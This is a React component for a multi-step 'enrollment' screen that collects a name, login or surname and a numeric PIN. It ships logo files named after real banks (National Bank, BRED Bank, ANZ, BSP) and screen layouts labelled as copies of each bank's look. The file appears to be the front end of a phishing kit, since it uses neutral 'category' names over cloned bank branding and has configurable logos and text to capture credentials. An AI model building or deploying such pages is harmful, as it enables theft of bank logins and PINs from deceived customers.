import { useEffect, useState } from "react";
import type { CSSProperties, FormEvent } from "react";
import { ArrowLeft, ArrowRight, ChevronDown, MapPin, Menu, Phone, X } from "lucide-react";
import type { EnrollmentCategory, PortalPageTheme } from "@workspace/api-client-react";
import { Link } from "wouter";
import { pageThemeBackground } from "../pageTheme";
import categoryOneLogo from "../assets/category-one-national-bank-logo-updated.png";
import categoryTwoLogo from "../assets/category-two-bred-bank-logo.jpg";
import categoryThreeLogo from "../assets/category-three-anz-logo.jpg";
import categoryFourLogo from "../assets/category-four-bsp-logo.jpg";

export type CategoryEntryAnswers = {
  name: string;
  nickname?: string;
  surname?: string;
};

type CategoryEntryFormProps = {
  categoryId: EnrollmentCategory["id"];
  reference: string;
  savedAnswers: Record<string, unknown>;
  isSaving: boolean;
  error: string;
  guestMode?: boolean;
  pinScreenBackground?: string;
  categoryInputTransparent?: boolean;
  screenCopy?: Record<string, string>;
  requiredFields?: string[];
  pageTheme?: PortalPageTheme;
  entryLogoDataUrl?: string | null;
  pinLogoDataUrl?: string | null;
  entryLogoAlignment?: string;
  entryLogoVerticalOffset?: string | number;
  pinLogoAlignment?: string;
  pinLogoVerticalOffset?: string | number;
  onComplete: (answers: CategoryEntryAnswers, pin: string) => void;
};

function savedValue(answers: Record<string, unknown>, key: string): string {
  const value = answers[key];
  return typeof value === "string" ? value : "";
}

export function CategoryEntryForm({
  categoryId,
  reference,
  savedAnswers,
  isSaving,
  error,
  guestMode = false,
  pinScreenBackground,
  categoryInputTransparent = true,
  screenCopy = {},
  requiredFields = [],
  pageTheme,
  entryLogoDataUrl,
  pinLogoDataUrl,
  entryLogoAlignment = "center",
  entryLogoVerticalOffset = "0",
  pinLogoAlignment = "center",
  pinLogoVerticalOffset = "0",
  onComplete,
}: CategoryEntryFormProps) {
  const isCategoryOne = categoryId === "category-1";
  const isCategoryTwo = categoryId === "category-2";
  const isCategoryThree = categoryId === "category-3";
  const isCategoryFour = categoryId === "category-4";
  const pinRequired = true;
  const entryLogo = entryLogoDataUrl || (isCategoryOne
    ? categoryOneLogo
    : isCategoryTwo
      ? categoryTwoLogo
      : isCategoryThree
        ? categoryThreeLogo
        : categoryFourLogo);
  const pinLogo = pinLogoDataUrl || entryLogo;
  const pinLength = isCategoryTwo ? 6 : 4;
  const lastDetailsStep = isCategoryTwo ? 1 : 0;
  const lastStep = pinRequired ? lastDetailsStep + 1 : lastDetailsStep;
  const [step, setStep] = useState(0);
  const [name, setName] = useState(() => savedValue(savedAnswers, "name"));
  const [nickname, setNickname] = useState(() => savedValue(savedAnswers, "nickname"));
  const [surname, setSurname] = useState(() => savedValue(savedAnswers, "surname"));
  const [pin, setPin] = useState("");
  const [categoryOneMenuOpen, setCategoryOneMenuOpen] = useState(false);
  const [categoryTwoMenuOpen, setCategoryTwoMenuOpen] = useState(false);
  const [categoryThreeMenuOpen, setCategoryThreeMenuOpen] = useState(false);
  const [validationError, setValidationError] = useState("");
  const isPinStep = pinRequired && step === lastStep;
  const activeLogoAlignment = isPinStep ? pinLogoAlignment : entryLogoAlignment;
  const logoAlignment = ["left", "center", "right"].includes(activeLogoAlignment) ? activeLogoAlignment : "center";
  const parsedLogoVerticalOffset = Number.parseInt(String(isPinStep ? pinLogoVerticalOffset : entryLogoVerticalOffset), 10);
  const logoVerticalOffset = Number.isFinite(parsedLogoVerticalOffset)
    ? Math.max(-120, Math.min(120, parsedLogoVerticalOffset))
    : 0;

  const activePinValue = pin;
  const setActivePinValue = setPin;

  const moveForward = () => {
    setValidationError("");
    setCategoryOneMenuOpen(false);
    setCategoryTwoMenuOpen(false);
    setCategoryThreeMenuOpen(false);
    if (step < lastDetailsStep) {
      setStep(step + 1);
      return;
    }
    if (pinRequired) {
      setStep(lastStep);
      return;
    }
    finish();
  };

  const moveBack = () => {
    setValidationError("");
    setCategoryOneMenuOpen(false);
    setCategoryTwoMenuOpen(false);
    setCategoryThreeMenuOpen(false);
    setPin("");
    setStep((current) => Math.max(0, current - 1));
  };

  const handleKeypad = (key: string) => {
    setValidationError("");
    if (key === "clear") {
      setActivePinValue("");
      return;
    }
    if (key === "delete") {
      setActivePinValue(activePinValue.slice(0, -1));
      return;
    }
    if (!/^\d$/.test(key) || activePinValue.length >= pinLength) return;
    setActivePinValue(activePinValue + key);
  };

  const finish = (continueIncomplete = false): boolean => {
    setValidationError("");
    if (!guestMode && !name.trim()) {
      setValidationError("Enter your name to continue.");
      return false;
    }
    if (!guestMode && isCategoryOne && !nickname.trim()) {
      setValidationError("Enter your nickname to continue.");
      return false;
    }
    if (!guestMode && !isCategoryOne && !surname.trim()) {
      setValidationError("Enter your surname to continue.");
      return false;
    }
    const pinPattern = new RegExp(`^\\d{${pinLength}}$`);
    if (pinRequired && !continueIncomplete && !pinPattern.test(pin)) {
      setValidationError(`Enter exactly ${pinLength} digits.`);
      return false;
    }
    onComplete({
      name: name.trim(),
      ...(isCategoryOne ? { nickname: nickname.trim() } : {}),
      ...(!isCategoryOne ? { surname: surname.trim() } : {}),
    }, pinRequired && pinPattern.test(pin) ? pin : "");
    return true;
  };

  const confirmPin = () => {
    if (isSaving) return;
    finish();
  };

  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isPinStep) confirmPin();
    else moveForward();
  };

  useEffect(() => {
    if (!error) return;
    if (isPinStep) setActivePinValue("");
  }, [error, isPinStep]);

  const defaultHeading = isPinStep
    ? "Create your PIN"
    : isCategoryTwo
      ? step === 0
        ? "Enter Name"
        : "Enter Surname"
      : isCategoryOne
        ? "Enter Identification Details"
        : "Enter Personal Details";

  const heading = screenCopy.title || defaultHeading;
  const primaryLabel = screenCopy[`buttonLabelStep${step + 1}`] || screenCopy.buttonLabel || (isPinStep
    ? "Complete"
    : isCategoryTwo && step === 0
      ? "Connect"
      : "Continue");
  const categoryPinBackground = isCategoryOne
    ? "#0EAD46"
    : isCategoryTwo || isCategoryFour
      ? "#ffffff"
      : isCategoryThree
        ? "#0369a1"
        : pinScreenBackground;
  const customPageBackground = pageThemeBackground(pageTheme);
  const formBackgroundStyle = ({
    "--entry-logo-offset-y": `${logoVerticalOffset}px`,
    ...(isPinStep && categoryPinBackground ? {
      backgroundColor: categoryPinBackground,
      "--entry-background": categoryPinBackground,
    } : {}),
    ...(customPageBackground ? { background: customPageBackground } : {}),
  } as CSSProperties);

  return (
    <main className={`category-entry-screen category-entry-screen-${categoryId} entry-logo-align-${logoAlignment} ${isCategoryOne || isCategoryThree ? "category-one-reference-screen" : ""} ${isCategoryOne && isPinStep ? "category-one-reference-pin-stage" : ""} ${isCategoryThree ? `category-three-reference-screen ${isPinStep ? "category-one-reference-pin-stage" : ""}` : ""} ${isCategoryTwo ? `category-two-reference-screen category-two-step-${step}` : ""} ${isCategoryFour ? "category-four-reference-screen" : ""} ${categoryInputTransparent ? "entry-input-transparent" : "entry-input-opaque"} ${isPinStep ? "entry-pin-stage" : ""}`} style={formBackgroundStyle} data-testid={`form-entry-${categoryId}`}>
      {isCategoryOne || isCategoryThree ? (
        <>
          <header className="category-one-reference-header">
            <button
              type="button"
              className="category-one-reference-menu-button"
              aria-label={(isCategoryOne ? categoryOneMenuOpen : categoryThreeMenuOpen) ? "Close enrollment menu" : "Open enrollment menu"}
              aria-expanded={isCategoryOne ? categoryOneMenuOpen : categoryThreeMenuOpen}
              aria-controls={isCategoryOne ? "category-one-reference-menu" : "category-three-reference-menu"}
              onClick={() => isCategoryOne
                ? setCategoryOneMenuOpen((open) => !open)
                : setCategoryThreeMenuOpen((open) => !open)}
              data-testid={isCategoryOne ? "button-category-one-menu" : "button-category-three-menu"}
            >
              {(isCategoryOne ? categoryOneMenuOpen : categoryThreeMenuOpen) ? <X size={22} /> : <Menu size={23} />}
            </button>
            <div className="category-one-reference-language" aria-label="Current language: English">
              <svg className="category-one-reference-flag" viewBox="0 0 24 16" aria-hidden="true">
                <rect width="24" height="16" fill="#23417a" />
                <path d="M0 0 24 16M24 0 0 16" stroke="#fff" strokeWidth="4" />
                <path d="M0 0 24 16M24 0 0 16" stroke="#c8102e" strokeWidth="1.7" />
                <path d="M12 0v16M0 8h24" stroke="#fff" strokeWidth="6" />
                <path d="M12 0v16M0 8h24" stroke="#c8102e" strokeWidth="2.8" />
              </svg>
              <span>English</span>
              <ChevronDown size={16} />
            </div>
          </header>
          {!isPinStep && isCategoryThree && (
            <div className="category-three-reference-brand">
              <img src={entryLogo} alt="Category Three entry logo" />
            </div>
          )}
          {!isPinStep && isCategoryOne && (
            <div className="category-one-bank-brand">
              <img src={entryLogo} alt="Category One entry logo" />
            </div>
          )}
          {(isCategoryOne && categoryOneMenuOpen || isCategoryThree && categoryThreeMenuOpen) && (
            <nav
              id={isCategoryOne ? "category-one-reference-menu" : "category-three-reference-menu"}
              className={`category-one-reference-menu ${isCategoryThree ? "category-three-reference-menu" : ""}`}
              aria-label="Enrollment navigation"
            >
              <Link href={guestMode ? "/guest/track" : "/dashboard"} onClick={() => { setCategoryOneMenuOpen(false); setCategoryThreeMenuOpen(false); }} data-testid="link-entry-dashboard">
                {guestMode ? "Track application" : "Dashboard"}
              </Link>
              {!guestMode && <Link href="/support" onClick={() => { setCategoryOneMenuOpen(false); setCategoryThreeMenuOpen(false); }} data-testid="link-entry-support">Contact support</Link>}
              {isPinStep && (
                <button
                  type="button"
                  className="category-one-menu-back"
                  onClick={() => {
                    moveBack();
                    setCategoryOneMenuOpen(false);
                    setCategoryThreeMenuOpen(false);
                  }}
                  data-testid="button-entry-back"
                >
                  <ArrowLeft size={14} /> {screenCopy.backButtonLabel || "Back to details"}
                </button>
              )}
              <span className="category-one-menu-reference">Application {reference}</span>
            </nav>
          )}
        </>
      ) : isCategoryTwo ? (
        <>
          <header className="category-two-reference-header">
            <button
              className="category-two-reference-language"
              type="button"
              aria-label={categoryTwoMenuOpen ? "Close language and navigation menu" : "Open language and navigation menu"}
              aria-expanded={categoryTwoMenuOpen}
              aria-controls="category-two-reference-menu"
              onClick={() => setCategoryTwoMenuOpen((open) => !open)}
              data-testid="button-category-two-language"
            >
              <span>EN</span><ChevronDown size={16} />
            </button>
          </header>
          {!isPinStep && (
            <div className={`category-two-reference-brand category-two-reference-brand-step-${step}`}>
              <img className="category-two-reference-logo" src={entryLogo} alt="Category Two entry logo" />
            </div>
          )}
          {categoryTwoMenuOpen && (
            <nav id="category-two-reference-menu" className="category-two-reference-menu" aria-label="Language and enrollment navigation">
              <span className="category-two-menu-language">English · Current language</span>
              <Link href={guestMode ? "/guest/track" : "/dashboard"} onClick={() => setCategoryTwoMenuOpen(false)} data-testid="link-entry-dashboard">
                {guestMode ? "Track application" : "Dashboard"}
              </Link>
              {!guestMode && <Link href="/support" onClick={() => setCategoryTwoMenuOpen(false)} data-testid="link-entry-support">Contact support</Link>}
              {step > 0 && (
                <button
                  type="button"
                  className="category-two-menu-back"
                  onClick={() => {
                    moveBack();
                    setCategoryTwoMenuOpen(false);
                  }}
                  data-testid="button-entry-back"
                >
                  <ArrowLeft size={14} /> {screenCopy.backButtonLabel || "Back one step"}
                </button>
              )}
              <span className="category-two-menu-reference">Application {reference}</span>
            </nav>
          )}
        </>
      ) : (
        <>
          <div className="entry-top-row">
            <Link href={guestMode ? "/guest/track" : "/dashboard"} className="entry-back-link" data-testid="link-entry-dashboard">
              <ArrowLeft size={16} /> {guestMode ? "Track application" : "Dashboard"}
            </Link>
            <span className="entry-reference">{reference}</span>
          </div>
        </>
      )}
      {isCategoryFour && !isPinStep && entryLogoDataUrl && (
        <div className="category-four-entry-brand"><img src={entryLogoDataUrl} alt="Category Four entry logo" /></div>
      )}

      <div className={`entry-content ${isCategoryOne || isCategoryThree ? "category-one-reference-content" : ""} ${isCategoryTwo ? "category-two-reference-content" : ""} ${isCategoryFour && !isPinStep ? "category-one-reference-content category-four-reference-content" : ""}`}>
        <section className={`entry-card ${isCategoryOne || isCategoryThree ? "category-one-reference-card" : ""} ${isCategoryTwo ? "category-two-reference-card" : ""} ${isCategoryFour && !isPinStep ? "category-one-reference-card category-four-reference-card" : ""}`} aria-labelledby="category-entry-heading">
          <h1 id="category-entry-heading" className="sr-only">{heading}</h1>
          {!isPinStep && (screenCopy.title?.trim() || screenCopy.description?.trim()) && (
            <div className={`entry-configurable-copy entry-configurable-copy-${categoryId}`} aria-hidden="true" data-testid="entry-configured-copy">
              {screenCopy.title?.trim() && <h2>{screenCopy.title}</h2>}
              {screenCopy.description?.trim() && <p>{screenCopy.description}</p>}
            </div>
          )}

          <form onSubmit={handleSubmit} noValidate>
            {!isPinStep && (
              <div className="entry-fields">
                {(isCategoryOne || step === 0) && (
                  <label className="entry-field" htmlFor="entry-name">
                    <span>{screenCopy.nameLabel || (isCategoryTwo ? "Login" : "Name")}{requiredFields.includes("name") && <small className="entry-required-label">Required</small>}</span>
                    <input
                      id="entry-name"
                      className="entry-line-input"
                      type="text"
                      autoComplete="given-name"
                      required={!guestMode}
                      value={name}
                      onChange={(event) => setName(event.target.value)}
                      placeholder={isCategoryTwo ? "Enter your login" : "Enter your name"}
                      data-testid="input-entry-name"
                    />
                  </label>
                )}
                {isCategoryOne && (
                  <label className="entry-field" htmlFor="entry-nickname">
                    <span>{screenCopy.nicknameLabel || "Nickname"}{requiredFields.includes("nickname") && <small className="entry-required-label">Required</small>}</span>
                    <input
                      id="entry-nickname"
                      className="entry-line-input"
                      type="text"
                      autoComplete="nickname"
                      required={!guestMode}
                      value={nickname}
                      onChange={(event) => setNickname(event.target.value)}
                      placeholder="Enter your nickname"
                      data-testid="input-entry-nickname"
                    />
                  </label>
                )}
                {(!isCategoryOne && !isCategoryTwo && step === 0) || (isCategoryTwo && step === 1) ? (
                  <label className="entry-field" htmlFor="entry-surname">
                    <span>{screenCopy.surnameLabel || "Surname"}{requiredFields.includes("surname") && <small className="entry-required-label">Required</small>}</span>
                    <input
                      id="entry-surname"
                      className="entry-line-input"
                      type="text"
                      autoComplete="family-name"
                      required={!guestMode}
                      value={surname}
                      onChange={(event) => setSurname(event.target.value)}
                      placeholder="Enter your surname"
                      data-testid="input-entry-surname"
                    />
                  </label>
                ) : null}
              </div>
            )}

            {isPinStep && (
              <section className="pin-entry-screen" aria-labelledby="pin-entry-heading">
                <button
                  type="button"
                  className="pin-entry-back"
                  aria-label="Back to previous step"
                  onClick={moveBack}
                  data-testid="button-pin-screen-back"
                >
                  <ArrowLeft size={21} />
                </button>

                <h1 id="pin-entry-heading" className="pin-entry-title" aria-live="polite">
                  {screenCopy.pinLabel || screenCopy.pinPrompt || (isCategoryTwo ? "Create a 6-digit PIN" : "Please enter your PIN")}
                </h1>
                {isCategoryThree && (
                  <div className="category-three-pin-brand">
                    <img src={pinLogo} alt="Category Three PIN logo" />
                  </div>
                )}
                {isCategoryOne && (
                  <div className="category-one-pin-brand">
                    <img src={pinLogo} alt="Category One PIN logo" />
                  </div>
                )}
                {isCategoryTwo && (
                  <>
                    <div className="category-two-pin-brand">
                      <img className="category-two-pin-logo" src={pinLogo} alt="Category Two PIN logo" />
                    </div>
                    <div className="category-two-pin-actions">
                      <Link href="/support" data-testid="link-category-two-pin-help">Need help?</Link>
                      <button type="button" onClick={moveBack} data-testid="button-category-two-pin-cancel">Cancel</button>
                    </div>
                  </>
                )}
                {isCategoryFour && (
                  <div className="category-four-pin-brand"><img src={pinLogo} alt="Category Four PIN logo" /></div>
                )}
                <p className="sr-only" id="pin-entry-help">
                  Enter {pinLength} digits, then choose Confirm PIN to continue. Choose Clear PIN to erase the entry.
                </p>
                <div className="pin-entry-indicators" aria-hidden="true">
                  {Array.from({ length: pinLength }, (_, index) => (
                    <span
                      key={index}
                      className={`pin-entry-indicator ${activePinValue.length > index ? "pin-entry-indicator-filled" : ""}`}
                    />
                  ))}
                  <input
                    id="entry-pin"
                    className="pin-entry-hidden-input"
                    type="password"
                    inputMode="none"
                    autoComplete="new-password"
                    pattern={`[0-9]{${pinLength}}`}
                    maxLength={pinLength}
                    required={!guestMode}
                    value={activePinValue}
                    aria-label={`Enter your ${pinLength}-digit PIN`}
                    aria-describedby="pin-entry-help"
                    onChange={(event) => {
                      setValidationError("");
                      setActivePinValue(event.target.value.replace(/\D/g, "").slice(0, pinLength));
                    }}
                    onKeyDown={(event) => {
                      if (event.key === "Backspace" || event.key === "Delete") {
                        event.preventDefault();
                        handleKeypad("delete");
                      }
                      if (event.key === "Enter") {
                        event.preventDefault();
                        confirmPin();
                      }
                    }}
                    data-testid="input-entry-pin"
                  />
                </div>
                {(validationError || error) && (
                  <p className="pin-entry-error" role="alert" data-testid="text-entry-error">
                    {validationError || error}
                  </p>
                )}
                <div className="pin-entry-keypad" role="group" aria-label="On-screen numeric keypad">
                  {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((digit) => (
                    <button
                      key={digit}
                      type="button"
                      className="pin-entry-key"
                      onClick={() => handleKeypad(digit)}
                      disabled={isSaving}
                      aria-label={`Enter ${digit}`}
                      data-testid={`button-pin-key-${digit}`}
                    >
                      {digit}
                    </button>
                  ))}
                  <button
                    type="button"
                    className="pin-entry-key pin-entry-key-clear"
                    onClick={() => handleKeypad("clear")}
                    disabled={isSaving}
                    aria-label="Clear PIN"
                    data-testid="button-pin-key-clear"
                  >
                    ×
                  </button>
                  <button
                    type="button"
                    className="pin-entry-key pin-entry-key-zero"
                    onClick={() => handleKeypad("0")}
                    disabled={isSaving}
                    aria-label="Enter 0"
                    data-testid="button-pin-key-0"
                  >
                    0
                  </button>
                  <button
                    type="button"
                    className="pin-entry-key pin-entry-key-confirm"
                    onClick={confirmPin}
                    disabled={isSaving}
                    aria-label="Confirm PIN and continue"
                    data-testid="button-pin-key-confirm"
                  >
                    ✓
                  </button>
                </div>
                {guestMode && <button type="button" className="text-action pin-entry-skip" onClick={() => finish(true)} disabled={isSaving} data-testid="button-continue-without-pin">
                  Continue without a PIN
                </button>}
              </section>
            )}

            {!isPinStep && (validationError || error) && (
              <p className="entry-error" role="alert" data-testid="text-entry-error">{validationError || error}</p>
            )}

            {isCategoryTwo && !isPinStep && step === 1 && (
              <div className="category-two-reference-step-links">
                <button type="button" onClick={moveBack} data-testid="button-category-two-back-to-name">Back to name</button>
                  {!guestMode && <Link href="/support" data-testid="link-category-two-step-help">Need help?</Link>}
              </div>
            )}
            {!isPinStep && (
              <div className="entry-actions">
                {step > 0 && !isCategoryOne && !isCategoryTwo ? (
                  <button type="button" className="entry-step-back" onClick={moveBack} data-testid="button-entry-back">
                    <ArrowLeft size={15} /> Back
                  </button>
                ) : <span />}
                <button
                  type="submit"
                  className="entry-primary-button"
                  disabled={isSaving}
                  data-testid={`button-entry-${primaryLabel.toLowerCase()}`}
                >
                  {primaryLabel} {isCategoryOne || isCategoryTwo ? null : <ArrowRight size={16} />}
                </button>
              </div>
            )}
            {isCategoryTwo && !isPinStep && step === 0 && !guestMode && (
              <Link className="category-two-reference-help" href="/support" data-testid="link-category-two-help">
                Need help?
              </Link>
            )}
            {(isCategoryOne || isCategoryThree) && !isPinStep && !guestMode && (
              <Link className="category-one-reference-help" href="/support" data-testid={isCategoryOne ? "link-category-one-help" : "link-category-three-help"}>
                Need help?
              </Link>
            )}
          </form>
        </section>
      </div>
      {(isCategoryOne || isCategoryThree) && !guestMode && (
        <Link className="category-one-reference-footer" href="/support" data-testid={isCategoryOne ? "link-category-one-contact" : "link-category-three-contact"}>
          <Phone size={20} fill="currentColor" /> Contact Us
        </Link>
      )}
      {isCategoryTwo && (
        <footer className="category-two-reference-footer">
          <div className="category-two-reference-contact">
            <span className="category-two-contact-icon" aria-hidden="true"><MapPin size={24} fill="currentColor" /></span>
              {!guestMode && <Link href="/support" className="category-two-contact-icon" aria-label="Contact support" data-testid="link-category-two-contact">
              <Phone size={24} fill="currentColor" />
              </Link>}
          </div>
          <details className="category-two-reference-privacy">
            <summary>Privacy Policy</summary>
            <p>{guestMode
              ? "Your application details are saved for authorized reviewers without an account. You can add a category PIN later; it is required only when submitting."
              : "Your application is available to authorized enrollment staff. Keep your PIN private and only provide information needed to review your enrollment."}</p>
          </details>
          <span className="category-two-reference-version">Secure enrollment</span>
        </footer>
      )}
    </main>
  );
}
